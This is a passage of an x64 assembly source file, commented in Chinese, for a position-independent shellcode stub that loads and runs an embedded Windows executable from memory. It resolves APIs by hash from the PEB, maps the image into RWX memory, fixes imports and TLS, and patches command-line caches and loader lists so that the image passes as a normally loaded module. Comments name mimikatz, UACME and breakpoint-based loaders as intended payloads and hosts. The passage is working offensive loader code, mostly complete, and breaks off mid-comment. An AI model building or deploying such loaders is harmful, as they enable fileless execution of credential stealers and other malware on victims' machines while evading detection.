; ============================================================================
; loader_x64.asm  ——  x64 "run PE from memory" 加载桩（位置无关）
;
; 编译：  nasm -f bin -o loader_x64.bin loader_x64.asm
;
; 运行时布局（由 exe2shellcode.py 生成）：
;   [本桩代码][实例参数块][原始 EXE 字节]
;
; 实例参数块布局（小端，Donut 风格）：
;   +0x00: uint16 cmdlineLen    —— CommandLine UTF-16LE 字节数（不含结尾 null）
;   +0x02: uint16 imagePathLen  —— ImagePathName UTF-16LE 字节数（不含结尾 null）
;   +0x04: CommandLine  UTF-16LE，以 \x00\x00 结尾
;   +... : ImagePathName UTF-16LE，以 \x00\x00 结尾
;
; EXE 起始地址 = 参数块 + 4 + cmdlineLen + 2 + imagePathLen + 2
;
; 流程：
;   1. 重建 PEB->ProcessParameters 的 CommandLine 与 ImagePathName（自动传参）
;   2. 遍历 PEB 找 kernel32.dll 基址
;   3. 用 djb2 哈希解析导出表得到 GetProcAddress / LoadLibraryA / VirtualAlloc
;   4. 按 SizeOfImage 申请可执行内存，拷贝 headers + sections
;   5. 若分配基址 != ImageBase，应用基址重定位
;   6. 修复导入地址表 (IAT)
;   7. 跳转到 AddressOfEntryPoint
; ============================================================================

BITS 64

; djb2 哈希常量（由工具计算，见 exe2shellcode.py / README）
HASH_GETPROCADDRESS equ 0xcf31bb1f
HASH_LOADLIBRARYA   equ 0x5fbff0fb
HASH_VIRTUALALLOC   equ 0x382c0f97
HASH_TLSALLOC       equ 0x8bf55163
HASH_TLSSETVALUE    equ 0xc324eba1

    ; 入口：find_export 在文件前部，必须保证偏移 0 处是真正入口
    jmp   start

; ---------------------------------------------------------------------------
; find_export:
;   输入: rdx = 模块基址, r8d = 目标导出名 djb2 哈希
;   输出: rax = 函数地址（失败为 0）
; ---------------------------------------------------------------------------
find_export:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15

    mov  r12, rdx                 ; module base
    mov  r13d, r8d                ; target hash

    mov  eax, [r12 + 0x3C]        ; e_lfanew
    add  rax, r12                 ; PE header
    mov  eax, [rax + 0x88]        ; export dir RVA (PE32+ DataDirectory[0])
    test eax, eax
    jz   .notfound
    add  rax, r12                 ; export dir
    mov  r14, rax
    mov  ecx, [r14 + 0x18]        ; NumberOfNames
    mov  r15d, [r14 + 0x20]       ; AddressOfNames RVA

    xor  ebx, ebx                 ; i = 0
.loop:
    cmp  ebx, ecx
    jae  .notfound

    lea  rdi, [r12 + r15]
    mov  esi, [rdi + rbx*4]       ; name RVA
    add  rsi, r12                 ; name ptr

    ; ---- djb2 ----
    mov  eax, 5381
.hash:
    movzx edx, byte [rsi]
    test  edx, edx
    jz    .cmp
    imul  eax, eax, 33
    add   eax, edx
    inc   rsi
    jmp   .hash
.cmp:
    cmp   eax, r13d
    je    .found
    inc   ebx
    jmp   .loop

.found:
    mov   eax, [r14 + 0x24]       ; AddressOfNameOrdinals RVA
    add   rax, r12
    movzx eax, word [rax + rbx*2] ; ordinal
    mov   ecx, [r14 + 0x1C]       ; AddressOfFunctions RVA
    add   rcx, r12
    mov   eax, [rcx + rax*4]      ; function RVA
    add   rax, r12
    jmp   .done

.notfound:
    xor   eax, eax
.done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

; ---------------------------------------------------------------------------
; ldr_insert_tail:
;   把一个 LDR_DATA_TABLE_ENTRY 挂到 PEB->Ldr 的某条模块链表尾部。
;   输入: rdi = PEB->Ldr, rbx = 新表项基址
;   %1 = 链表头在 PEB_LDR_DATA 内的偏移, %2 = LIST_ENTRY 在表项内的偏移
;   破坏: r10, r11, rsi
; ---------------------------------------------------------------------------
%macro ldr_insert_tail 2
    lea   r10, [rbx + %2]         ; N = 新节点
    lea   r11, [rdi + %1]         ; H = 链表头
    mov   rsi, [r11 + 8]          ; T = H->Blink（旧尾节点）
    mov   [r10 + 0], r11          ; N->Flink = H
    mov   [r10 + 8], rsi          ; N->Blink = T
    mov   [rsi + 0], r10          ; T->Flink = N
    mov   [r11 + 8], r10          ; H->Blink = N
%endmacro

; ---------------------------------------------------------------------------
; 入口
; ---------------------------------------------------------------------------
start:
    ; rcx = lpParameter（loader 通过 CreateThread 传入的运行时参数，UTF-16LE，可为 NULL）
    ; ==== 提前建立栈帧，保存 lpParameter 和原始命令行 ====
    ; 注意：线程入口 rsp%16==8，栈帧必须 %16==8（如 0xE8），保持调用 API 前 rsp%16==0
    ; 0xE8 比原来多出的空间给 [rsp+0xB0] 的 MEMORY_BASIC_INFORMATION（0x30 字节）
    sub   rsp, 0xE8

    mov   [rsp + 0x78], rcx       ; 保存 lpParameter

    mov   rdx, gs:[0x60]          ; PEB
    mov   rdx, [rdx + 0x20]       ; ProcessParameters
    mov   rax, [rdx + 0x78]       ; 原始 CommandLine.Buffer
    mov   [rsp + 0x80], rax       ; 保存原始 CommandLine.Buffer
    movzx eax, word [rdx + 0x70]  ; 原始 CommandLine.Length
    mov   [rsp + 0x88], ax        ; 保存原始 CommandLine.Length
    mov   rax, [rdx + 0x68]       ; 原始 ImagePathName.Buffer
    mov   [rsp + 0x90], rax       ; 保存原始 ImagePathName.Buffer
    movzx eax, word [rdx + 0x60]  ; 原始 ImagePathName.Length
    mov   [rsp + 0x98], ax        ; 保存原始 ImagePathName.Length

    ; ==== 1. 定位实例参数块（紧跟本桩之后） ====
    lea   rbx, [rel args_block]

    ; ==== 2. 读取长度字段 ====
    movzx eax, word [rbx + 0]     ; cmdlineLen
    movzx ecx, word [rbx + 2]     ; imagePathLen

    ; （不覆盖 PEB，第 13 步统一设置 CommandLine 和 ImagePathName）

    ; ==== 4. 定位嵌入 EXE 起始 ====
    ; exe = 参数块 + 4 + cmdlineLen + 2 + imagePathLen + 2
    lea   rdi, [rbx + rax + 8]
    add   rdi, rcx

    ; ==== 4. 找 kernel32.dll 基址 ====
    mov   rax, gs:[0x60]          ; PEB
    mov   rax, [rax + 0x18]       ; Ldr
    mov   rax, [rax + 0x20]       ; InMemoryOrderModuleList.Flink
    mov   rax, [rax]              ; 第 2 个模块 (ntdll)
    mov   rax, [rax]              ; 第 3 个模块 (kernel32)
    mov   r12, [rax + 0x20]       ; DllBase（节点指向 InMemoryOrderLinks，+0x20 才是 DllBase）

    ; ==== 5. 解析 API ====
    mov   rdx, r12
    mov   r8d, HASH_GETPROCADDRESS
    call  find_export
    mov   r13, rax
    test  r13, r13
    jz    fail_late

    mov   rdx, r12
    mov   r8d, HASH_LOADLIBRARYA
    call  find_export
    mov   r14, rax
    test  r14, r14
    jz    fail_late

    mov   rdx, r12
    mov   r8d, HASH_VIRTUALALLOC
    call  find_export
    mov   r15, rax
    test  r15, r15
    jz    fail_late

    ; ==== 6. 解析嵌入 EXE 的 PE 头 ====
    cmp   word [rdi], 0x5A4D      ; 'MZ'
    jne   fail_late
    mov   esi, [rdi + 0x3C]       ; e_lfanew
    add   rsi, rdi                ; PE header
    cmp   dword [rsi], 0x00004550 ; 'PE\0\0'
    jne   fail_late

    movzx eax, word [rsi + 6]     ; NumberOfSections
    movzx ecx, word [rsi + 20]    ; SizeOfOptionalHeader
    lea   rdx, [rsi + 24]         ; optional header
    lea   rcx, [rdx + rcx]        ; section table 起点
    mov   r8d,  [rdx + 0x38]      ; SizeOfImage
    mov   r9d,  [rdx + 0x3C]      ; SizeOfHeaders
    mov   r10d, [rdx + 0x10]      ; AddressOfEntryPoint
    mov   r11,  [rdx + 0x18]      ; ImageBase

    ; ---- 保存 8 个值（栈帧已在 start 开头建立） ----
    mov   [rsp + 0x20], rdi       ; exe base
    mov   [rsp + 0x28], rcx       ; section table
    mov   [rsp + 0x30], rax       ; NumberOfSections
    mov   [rsp + 0x38], r8        ; SizeOfImage
    mov   [rsp + 0x40], r9        ; SizeOfHeaders
    mov   [rsp + 0x48], r10       ; EntryPoint
    mov   [rsp + 0x50], r11       ; ImageBase
    mov   [rsp + 0x58], rdx       ; optional header

    ; ==== 7. 分配内存 ====
    xor   ecx, ecx
    mov   edx, r8d                ; dwSize = SizeOfImage
    mov   r8d, 0x3000             ; MEM_COMMIT | MEM_RESERVE
    mov   r9d, 0x40               ; PAGE_EXECUTE_READWRITE
    call  r15
    test  rax, rax
    jz    fail_late
    mov   rbp, rax                ; base

    ; ==== 8. 拷贝 headers ====
    mov   rcx, [rsp + 0x40]       ; SizeOfHeaders
    mov   rsi, [rsp + 0x20]       ; exe base
    mov   rdi, rbp
    rep movsb

    ; ==== 9. 拷贝 sections ====
    mov   rax, [rsp + 0x28]       ; section table
    mov   r10, [rsp + 0x30]       ; NumberOfSections
.copy_sec:
    test  r10, r10
    jz    .copy_done
    mov   r11d, [rax + 12]        ; VirtualAddress
    mov   r8d,  [rax + 16]        ; SizeOfRawData
    mov   r9d,  [rax + 20]        ; PointerToRawData
    test  r8d, r8d
    jz    .next_sec
    mov   rcx, r8
    mov   rsi, [rsp + 0x20]
    add   rsi, r9
    lea   rdi, [rbp + r11]
    push  rax
    rep movsb
    pop   rax
.next_sec:
    add   rax, 40
    dec   r10
    jmp   .copy_sec
.copy_done:

    ; ==== 10. 基址重定位 ====
    mov   rdx, rbp
    sub   rdx, [rsp + 0x50]       ; delta = base - ImageBase
    jz    .reloc_done
    mov   rax, [rsp + 0x58]       ; optional header
    mov   r8d, [rax + 0x98]       ; reloc VA (DataDirectory[5])
    mov   r9d, [rax + 0x9C]       ; reloc size
    test  r8d, r8d
    jz    .reloc_done
    lea   r10, [rbp + r8]
    lea   r9,  [r10 + r9]         ; end
.reloc_blk:
    cmp   r10, r9
    jae   .reloc_done
    mov   r11d, [r10 + 0]         ; page RVA
    mov   r8d,  [r10 + 4]         ; block size
    lea   rcx, [r10 + 8]
    lea   r8,  [r10 + r8]         ; block end
.reloc_ent:
    cmp   rcx, r8
    jae   .reloc_next_blk
    movzx eax, word [rcx]
    mov   ebx, eax
    shr   ebx, 12                 ; type
    and   eax, 0xFFF              ; offset
    cmp   bl, 10                  ; IMAGE_REL_BASED_DIR64
    jne   .reloc_ent_next
    lea   rbx, [rbp + r11]
    add   rbx, rax
    add   qword [rbx], rdx
.reloc_ent_next:
    add   rcx, 2
    jmp   .reloc_ent
.reloc_next_blk:
    mov   r10, r8
    jmp   .reloc_blk
.reloc_done:

    ; ==== 11. 导入表修复 ====
    mov   rax, [rsp + 0x58]       ; optional header
    mov   r8d, [rax + 0x78]       ; import VA (DataDirectory[1])
    test  r8d, r8d
    jz    .imp_done
    lea   r9, [rbp + r8]          ; 第一个 IMAGE_IMPORT_DESCRIPTOR
    mov   [rsp + 0x60], r9        ; 跨 call 保存 descriptor 指针
.imp_dll:
    mov   r9, [rsp + 0x60]        ; 恢复 descriptor
    cmp   dword [r9 + 0], 0       ; OriginalFirstThunk == 0 ?
    jne   .imp_has
    cmp   dword [r9 + 16], 0      ; FirstThunk == 0 ?
    je    .imp_done
.imp_has:
    mov   r8d, [r9 + 12]          ; Name RVA
    lea   rcx, [rbp + r8]
    call  r14                     ; LoadLibraryA(name)
    test  rax, rax
    jz    .imp_next_dll
    mov   [rsp + 0x68], rax       ; 跨 call 保存 dll handle

    mov   r9, [rsp + 0x60]        ; 重新恢复 descriptor（call 会破坏 r9）
    mov   r8d, [r9 + 0]           ; OriginalFirstThunk
    test  r8d, r8d
    jnz   .imp_use_oft
    mov   r8d, [r9 + 16]          ; 若 OFT 为 0 用 FirstThunk
.imp_use_oft:
    lea   r11, [rbp + r8]         ; thunk 数组
    mov   [rsp + 0x70], r11       ; 跨 call 保存 thunk 指针
    mov   r8d, [r9 + 16]
    lea   rbx, [rbp + r8]         ; IAT 写回地址（rbx 非易失）
.imp_thunk:
    mov   r11, [rsp + 0x70]       ; 恢复 thunk 指针
    mov   rax, [r11]
    test  rax, rax
    jz    .imp_next_dll
    btr   rax, 63
    jc    .imp_ord                ; 高位为 1 => ordinal 导入
    lea   rdx, [rbp + rax]        ; 函数名（第二参数 rdx）
    add   rdx, 2                  ; 跳过 Hint
    mov   rcx, [rsp + 0x68]       ; dll handle（第一参数 rcx）
    call  r13                     ; GetProcAddress(handle, name)
    jmp   .imp_store
.imp_ord:
    mov   rcx, [rsp + 0x68]       ; dll handle
    mov   rdx, rax
    call  r13                     ; GetProcAddress(handle, ordinal)
.imp_store:
    mov   [rbx], rax
    mov   r11, [rsp + 0x70]       ; 恢复并推进 thunk 指针
    add   r11, 8
    mov   [rsp + 0x70], r11
    add   rbx, 8
    jmp   .imp_thunk
.imp_next_dll:
    mov   r9, [rsp + 0x60]        ; 恢复并推进 descriptor
    add   r9, 20
    mov   [rsp + 0x60], r9
    jmp   .imp_dll
.imp_done:

    ; ==== 12. TLS 处理 ====
    mov   rax, [rsp + 0x58]       ; optional header
    mov   r8d, [rax + 0xB8]       ; TLS dir RVA (DataDirectory[9])
    test  r8d, r8d
    jz    .tls_done
    lea   r9, [rbp + r8]          ; TLS 目录
    mov   [rsp + 0x60], r9        ; 保存 TLS 目录

    ; --- TlsAlloc() 分配 TLS 索引 ---
    mov   rdx, r12                ; kernel32
    mov   r8d, HASH_TLSALLOC
    call  find_export
    test  rax, rax
    jz    .tls_cb
    call  rax                     ; TlsAlloc()
    cmp   eax, 0xFFFFFFFF         ; TLS_OUT_OF_INDEXES
    je    .tls_cb
    mov   [rsp + 0x68], rax       ; 保存 index

    ; --- __tls_index = index ---
    mov   r9, [rsp + 0x60]
    mov   r10, [r9 + 0x10]        ; AddressOfIndex（重定位后实际地址）
    mov   [r10], eax

    ; --- 分配并拷贝 TLS 数据 ---
    mov   r10, [r9 + 0x08]        ; EndAddressOfRawData
    mov   r11, [r9 + 0x00]        ; StartAddressOfRawData
    sub   r10, r11                ; 模板大小
    mov   r8d, [r9 + 0x20]        ; SizeOfZeroFill
    add   r10, r8                 ; 总大小
    xor   ecx, ecx
    mov   rdx, r10
    mov   r8d, 0x3000
    mov   r9d, 0x04               ; PAGE_READWRITE
    call  r15                     ; VirtualAlloc
    test  rax, rax
    jz    .tls_cb
    mov   [rsp + 0x70], rax       ; 保存 TLS 数据指针

    mov   r9, [rsp + 0x60]
    mov   r11, [r9 + 0x00]        ; Start
    mov   r10, [r9 + 0x08]        ; End
    sub   r10, r11                ; 模板大小
    test  r10, r10
    jz    .tls_set_teb
    mov   rcx, r10
    mov   rsi, r11
    mov   rdi, rax
    rep movsb

.tls_set_teb:
    ; 直接写 TEB->ThreadLocalStoragePointer[index] = TLS 数据
    mov   rax, gs:[0x30]          ; TEB
    mov   rax, [rax + 0x58]       ; ThreadLocalStoragePointer (x64 +0x58)
    mov   rcx, [rsp + 0x68]       ; index
    mov   rdx, [rsp + 0x70]       ; TLS 数据
    mov   [rax + rcx * 8], rdx

    ; --- 执行 TLS 回调（DLL_PROCESS_ATTACH） ---
.tls_cb:
    mov   r9, [rsp + 0x60]
    mov   r10, [r9 + 0x18]        ; AddressOfCallBacks（重定位后实际地址）
    test  r10, r10
    jz    .tls_done
    mov   rbx, r10                ; 回调数组
.tls_loop:
    mov   rax, [rbx]              ; 回调（重定位后实际地址）
    test  rax, rax
    jz    .tls_done
    mov   rcx, rbp                ; DllHandle
    mov   rdx, 1                  ; DLL_PROCESS_ATTACH
    xor   r8, r8                  ; Reserved
    call  rax                     ; 执行 TLS 回调
    add   rbx, 8
    jmp   .tls_loop
.tls_done:

    ; ==== 13. 提取运行时参数：lpParameter 优先，否则宿主命令行 ====
    ; [rsp+0x78] = lpParameter；[rsp+0x80] = 原始 CommandLine.Buffer；[rsp+0x88] = 原始 CommandLine.Length
    xor   r9, r9
    xor   r10, r10
    mov   rsi, [rsp + 0x78]       ; lpParameter（UTF-16LE，NULL 结尾）
    test  rsi, rsi
    jz    .try_host_argv          ; 无 lpParameter → 回落到宿主命令行尾部参数
    cmp   word [rsi], 0
    je    .try_host_argv          ; 空 lpParameter → 同上

    ; ---- 校验 lpParameter 确实是「可读的参数字符串」 ----
    ; 走 VEH / 硬件断点派发的 loader（如 r-loader）不会传参，入口 rcx 是当时的任意活值；
    ; 不校验就会把那段内存当 UTF-16 拼进命令行，目标程序看到一堆乱码参数。
    ; 1) NtQueryVirtualMemory 确认首地址在已提交、可读、非 PAGE_GUARD 的页上
    lea   rcx, [rel str_ntdll]
    call  r14                     ; LoadLibraryA("ntdll.dll")
    test  rax, rax
    jz    .try_host_argv
    mov   rcx, rax
    lea   rdx, [rel str_ntqueryvm]
    call  r13                     ; GetProcAddress(ntdll, "NtQueryVirtualMemory")
    test  rax, rax
    jz    .try_host_argv

    mov   rcx, -1                 ; NtCurrentProcess()
    mov   rdx, rsi                ; BaseAddress
    xor   r8d, r8d                ; MemoryBasicInformation = 0
    lea   r9, [rsp + 0xB0]        ; &MEMORY_BASIC_INFORMATION
    mov   qword [rsp + 0x20], 48  ; Size
    mov   qword [rsp + 0x28], 0   ; ReturnLength = NULL
    call  rax
    test  eax, eax
    jnz   .try_host_argv          ; 查询失败 → 不是有效指针
    mov   ecx, [rsp + 0xB0 + 0x20] ; State
    cmp   ecx, 0x1000             ; MEM_COMMIT
    jne   .try_host_argv
    mov   ecx, [rsp + 0xB0 + 0x24] ; Protect
    cmp   ecx, 0x01               ; PAGE_NOACCESS
    je    .try_host_argv
    test  ecx, 0x100              ; PAGE_GUARD
    jnz   .try_host_argv

    ; 2) 内容是合理宽字符串：上限 2048 字符，除 Tab 外不允许控制字符
    mov   r8, rsi
    xor   edx, edx                ; 已扫描字符数
.strlen_loop:
    movzx ecx, word [r8]
    test  ecx, ecx
    jz    .strlen_done
    cmp   edx, 2048
    jae   .try_host_argv          ; 过长 → 不是参数串
    cmp   ecx, 0x20
    jae   .strlen_next
    cmp   ecx, 0x09               ; 允许 Tab
    jne   .try_host_argv          ; 其它控制字符 → 不是参数串
.strlen_next:
    add   r8, 2
    inc   edx
    jmp   .strlen_loop
.strlen_done:
    test  edx, edx
    jz    .try_host_argv
    mov   r9, rsi
    mov   r10, r8
    sub   r10, rsi                ; 参数字节长度
    jmp   .have_args

.try_host_argv:
    ; ---- 回落到宿主命令行：跳过 argv[0]（loader 自己）和 argv[1]（payload 路径） ----
    ; 例：r-loader.exe .\f.bin -h 127.0.0.1  →  运行时参数 = "-h 127.0.0.1"
    ; 这样 VEH/APC 类不传 lpParameter 的 loader 也能带参运行（参数会覆盖烘焙值）。
    mov   rsi, [rsp + 0x80]       ; 原始 CommandLine.Buffer
    movzx ecx, word [rsp + 0x88]  ; 原始 CommandLine.Length（字节）
    test  rsi, rsi
    jz    .no_runtime_args
    test  ecx, ecx
    jz    .no_runtime_args
    lea   rdx, [rsi + rcx]        ; 末尾（不含 NUL）

    mov   r8d, 2                  ; 需要跳过 2 个 token
.host_tok:
.host_ws:
    cmp   rsi, rdx
    jae   .no_runtime_args
    movzx eax, word [rsi]
    cmp   eax, 0x20
    je    .host_ws_next
    cmp   eax, 0x09
    jne   .host_tok_begin
.host_ws_next:
    add   rsi, 2
    jmp   .host_ws
.host_tok_begin:
    cmp   eax, 0x22               ; '"'
    jne   .host_bare
    add   rsi, 2                  ; 带引号的 token
.host_quoted:
    cmp   rsi, rdx
    jae   .no_runtime_args
    movzx eax, word [rsi]
    add   rsi, 2
    cmp   eax, 0x22
    jne   .host_quoted
    jmp   .host_tok_done
.host_bare:
    cmp   rsi, rdx
    jae   .host_tok_done
    movzx eax, word [rsi]
    cmp   eax, 0x20
    je    .host_tok_done
    cmp   eax, 0x09
    je    .host_tok_done
    add   rsi, 2
    jmp   .host_bare
.host_tok_done:
    dec   r8d
    jnz   .host_tok

.host_ws2:
    cmp   rsi, rdx
    jae   .no_runtime_args        ; payload 路径后面没有参数
    movzx eax, word [rsi]
    cmp   eax, 0x20
    je    .host_ws2_next
    cmp   eax, 0x09
    jne   .host_args_found
.host_ws2_next:
    add   rsi, 2
    jmp   .host_ws2
.host_args_found:
    mov   r9, rsi
    mov   r10, rdx
    sub   r10, rsi                ; 参数字节长度
.host_trim:                       ; 去掉尾部空白
    cmp   r10, 0
    jbe   .no_runtime_args
    movzx eax, word [r9 + r10 - 2]
    cmp   eax, 0x20
    je    .host_trim_next
    cmp   eax, 0x09
    jne   .have_args
.host_trim_next:
    sub   r10, 2
    jmp   .host_trim

.have_args:
    mov   [rsp + 0x60], r9        ; 保存参数指针
    mov   [rsp + 0x68], r10       ; 保存参数长度

    ; 分配缓冲区（宽松大小：2*paramLen + imagePathLen + 16）
    lea   rbx, [rel args_block]
    movzx edx, word [rbx + 2]     ; imagePathLen
    lea   r11, [r10 + r10 + rdx + 16]
    xor   ecx, ecx
    mov   rdx, r11
    mov   r8d, 0x3000
    mov   r9d, 0x04               ; PAGE_READWRITE
    call  r15                     ; VirtualAlloc
    test  rax, rax
    jz    .no_runtime_args
    mov   rbx, rax                ; 新缓冲区

    ; 拷贝程序名
    lea   r9, [rel args_block]
    movzx ecx, word [r9 + 2]      ; imagePathLen
    movzx edx, word [r9 + 0]      ; cmdlineLen
    lea   rsi, [r9 + 4 + rdx + 2] ; 程序名数据
    mov   rdi, rbx
    rep movsb

    ; ==== 解析并拼接多参数（支持引号分组） ====
    mov   rsi, [rsp + 0x60]       ; lpParameter 指针
    xor   r15d, r15d              ; 参数计数
.arg_loop:
    ; 跳过前导空白
.skip_ws:
    movzx eax, word [rsi]
    test  eax, eax
    jz    .args_done
    cmp   eax, 0x20
    je    .skip_next
    cmp   eax, 0x09
    je    .skip_next
    jmp   .arg_start
.skip_next:
    add   rsi, 2
    jmp   .skip_ws
.arg_start:
    ; 每个参数前加空格（程序名已在前）
    mov   word [rdi], 0x20
    add   rdi, 2
    inc   r15d
    ; 引号分组？
    cmp   word [rsi], 0x22
    jne   .plain_arg
    ; 引号参数：保留引号并拷贝内部内容
    mov   word [rdi], 0x22
    add   rdi, 2
    add   rsi, 2
.quote_copy:
    movzx eax, word [rsi]
    test  eax, eax
    jz    .quote_end
    cmp   eax, 0x22
    je    .quote_end
    mov   [rdi], ax
    add   rdi, 2
    add   rsi, 2
    jmp   .quote_copy
.quote_end:
    mov   word [rdi], 0x22
    add   rdi, 2
    cmp   word [rsi], 0x22        ; 消费闭合引号
    jne   .arg_loop
    add   rsi, 2
    jmp   .arg_loop
.plain_arg:
    ; 普通参数：拷贝直到空白或结束
.plain_copy:
    movzx eax, word [rsi]
    test  eax, eax
    jz    .args_done
    cmp   eax, 0x20
    je    .plain_end
    cmp   eax, 0x09
    je    .plain_end
    mov   [rdi], ax
    add   rdi, 2
    add   rsi, 2
    jmp   .plain_copy
.plain_end:
    jmp   .arg_loop
.args_done:
    mov   word [rdi], 0           ; null 结尾

    ; ==== 设置 CommandLine（长度 = 实际拼接结果） ====
    mov   rdx, rdi
    sub   rdx, rbx                ; 字节长度（不含 null）
    mov   rcx, gs:[0x60]
    mov   rcx, [rcx + 0x20]
    mov   [rcx + 0x78], rbx       ; Buffer
    mov   [rcx + 0x70], dx        ; Length
    mov   [rcx + 0x72], dx        ; MaximumLength
    mov   [rsp + 0x70], rbx       ; 保存新 CommandLine 缓冲区指针
    jmp   .set_imagepath

.no_runtime_args:
    ; 无参数：CommandLine = 嵌入块
    mov   rdx, gs:[0x60]
    mov   rdx, [rdx + 0x20]
    lea   rbx, [rel args_block]
    movzx eax, word [rbx + 0]     ; cmdlineLen
    lea   r8, [rbx + 4]           ; CommandLine 数据
    mov   [rdx + 0x78], r8
    mov   [rdx + 0x70], ax
    mov   [rdx + 0x72], ax
    mov   [rsp + 0x70], r8        ; 保存嵌入块 CommandLine 指针

.set_imagepath:
    ; ImagePathName = 程序名（嵌入块）
    mov   rdx, gs:[0x60]
    mov   rdx, [rdx + 0x20]
    lea   rbx, [rel args_block]
    movzx eax, word [rbx + 0]     ; cmdlineLen
    movzx ecx, word [rbx + 2]     ; imagePathLen
    lea   r8, [rbx + rax + 6]     ; ImagePathName 数据
    mov   [rdx + 0x68], r8
    mov   [rdx + 0x60], cx
    mov   [rdx + 0x62], cx

    ; ==== 动态修改 GetCommandLineW 缓存（跨 Win10/Win11 兼容） ====
    ; Win11：GetCommandLineW 实现为 mov rax,[rel X]; ret（读 kernelbase 缓存变量）
    ; Win10：GetCommandLineW 直接读 PEB，此处指令不匹配则自动跳过（PEB 修改已生效）
    lea   rcx, [rel str_kernelbase]
    call  r14                     ; LoadLibraryA("kernelbase.dll")
    test  rax, rax
    jz    .no_gcl_cache
    mov   rcx, rax
    lea   rdx, [rel str_getcmdline]
    call  r13                     ; GetProcAddress("GetCommandLineW")
    test  rax, rax
    jz    .no_gcl_cache
    ; 解析 mov rax,[rip+disp32] = 48 8B 05 disp32
    cmp   byte [rax], 0x48
    jne   .no_gcl_cache
    cmp   byte [rax+1], 0x8B
    jne   .no_gcl_cache
    cmp   byte [rax+2], 0x05
    jne   .no_gcl_cache
    mov   edx, [rax+3]            ; disp32（有符号）
    movsxd rdx, edx
    lea   rdx, [rax + rdx + 7]    ; 缓存变量地址 = 指令下一条 + disp32
    mov   rcx, [rsp + 0x70]       ; 新 CommandLine 指针
    mov   [rdx], rcx              ; 更新缓存

.no_gcl_cache:

    ; ==== 13.5 同步修改 msvcrt 缓存的命令行指针（关键！） ====
    ; msvcrt!__wgetmainargs 不是实时调用 GetCommandLineW，
    ; 而是读 msvcrt 私有缓存 _wcmdln（进程启动时 GetCommandLineW 结果）。
    ; 不改这里，MSVC+msvcrt 程序（如 mimikatz）拿到的永远是宿主命令行。
    ; 动态定位 _wcmdln：GetProcAddress(msvcrt, "_wcmdln") 直接返回该变量地址，
    ; 无需硬编码版本相关偏移（兼容 Win10/Win11 不同 msvcrt）。
    lea   rcx, [rel str_msvcrt]
    call  r14                     ; LoadLibraryA("msvcrt.dll")
    test  rax, rax
    jz    .no_msvcrt_fix
    mov   rbx, rax                ; msvcrt handle（rbx 非易失）
    mov   rcx, rax
    lea   rdx, [rel str_wcmdln]
    call  r13                     ; GetProcAddress(msvcrt, "_wcmdln")
    test  rax, rax
    jz    .no_msvcrt_fix
    mov   rcx, [rsp + 0x70]       ; 新 CommandLine 指针（loader 已设置）
    mov   [rax], rcx              ; _wcmdln = 新 CommandLine
.no_msvcrt_fix:

    ; ==== 13.8 让被映射的映像“像被系统真正加载过一样” ====
    ; 手工映射的 PE 不会被 ntdll 登记，会带来两个致命问题：
    ;   1) x64 的 SEH 是**表驱动**的。不把 .pdata 注册给系统时，目标程序里的
    ;      __try/__except 完全失效。UACME/Akagi64 的 StubInit 故意做 int 除零
    ;      并靠 __except 继续执行（反沙箱手法），未注册时异常直接上抛、进程当场死掉。
    ;   2) PEB->ImageBaseAddress / PEB->Ldr 仍指向宿主进程（如 python.exe），
    ;      目标程序用 GetModuleHandle(NULL)、GetModuleFileName(NULL)、
    ;      NtCurrentPeb()->ImageBaseAddress 查自身资源/自身路径时，拿到的全是宿主的。

    ; ---- 13.8.1 注册异常表 .pdata（RtlAddFunctionTable） ----
    mov   rax, [rsp + 0x58]       ; optional header
    mov   r8d, [rax + 0x88]       ; DataDirectory[3].VirtualAddress = 异常表 RVA
    mov   r9d, [rax + 0x8C]       ; DataDirectory[3].Size
    test  r8d, r8d
    jz    .no_seh_table
    test  r9d, r9d
    jz    .no_seh_table

    lea   rcx, [rel str_ntdll]
    call  r14                     ; LoadLibraryA("ntdll.dll")
    test  rax, rax
    jz    .no_seh_table
    mov   rcx, rax
    lea   rdx, [rel str_rtladdft]
    call  r13                     ; GetProcAddress(ntdll, "RtlAddFunctionTable")
    test  rax, rax
    jz    .no_seh_table
    mov   [rsp + 0xA0], rax

    mov   rax, [rsp + 0x58]       ; call 会破坏 r8/r9，重新取
    mov   r8d, [rax + 0x88]
    mov   eax, [rax + 0x8C]
    xor   edx, edx
    mov   ecx, 12                 ; sizeof(RUNTIME_FUNCTION)
    div   ecx                     ; eax = 表项数 = size / 12
    lea   rcx, [rbp + r8]         ; FunctionTable
    mov   edx, eax                ; EntryCount
    mov   r8, rbp                 ; BaseAddress
    call  qword [rsp + 0xA0]      ; RtlAddFunctionTable(table, count, base)
.no_seh_table:

    ; ---- 13.8.2 构造 LDR_DATA_TABLE_ENTRY 并挂进三条模块链表 ----
    mov   rdx, r12
    mov   r8d, HASH_VIRTUALALLOC
    call  find_export             ; r15 在参数处理阶段被复用为计数器，这里重新解析
    test  rax, rax
    jz    .no_ldr_entry
    mov   r15, rax

    xor   ecx, ecx
    mov   edx, 0x600              ; [0x000 表项][0x200 FullDllName][0x400 BaseDllName]
    mov   r8d, 0x3000             ; MEM_COMMIT | MEM_RESERVE
    mov   r9d, 0x04               ; PAGE_READWRITE
    call  r15                     ; VirtualAlloc
    test  rax, rax
    jz    .no_ldr_entry
    mov   rbx, rax

    ; 先以真实表项为模板：把宿主 exe 的 LDR_DATA_TABLE_ENTRY 整块拷过来。
    ; 原因是 ntdll 内部还会用到一些“私有”字段（例如 +0x98 指向的每模块结构），
    ; 这些字段留 0 时，进程退出/按地址查模块的代码会解引用 NULL 而崩。
    mov   rax, gs:[0x60]
    mov   rax, [rax + 0x18]       ; PEB->Ldr
    mov   rsi, [rax + 0x10]       ; InLoadOrderModuleList.Flink = 第一个模块（宿主 exe）
    mov   rdi, rbx
    mov   ecx, 0x140 / 8
    rep movsq

    ; 名称数据 = 实例参数块里的 ImagePathName（UTF-16LE）
    lea   r9, [rel args_block]
    movzx ecx, word [r9 + 0]      ; cmdlineLen
    lea   r10, [r9 + rcx + 6]     ; ImagePathName 数据 = 块首 + 4 + cmdlineLen + 2
    movzx ecx, word [r9 + 2]      ; imagePathLen（字节）
    mov   r11, rcx
    mov   rsi, r10
    lea   rdi, [rbx + 0x200]
    rep movsb                     ; FullDllName 缓冲
    mov   rsi, r10
    lea   rdi, [rbx + 0x400]
    mov   rcx, r11
    rep movsb                     ; BaseDllName 缓冲

    ; HashLinks 自身成环：我们并没有被插进 LdrpHashTable，成环后即使有代码
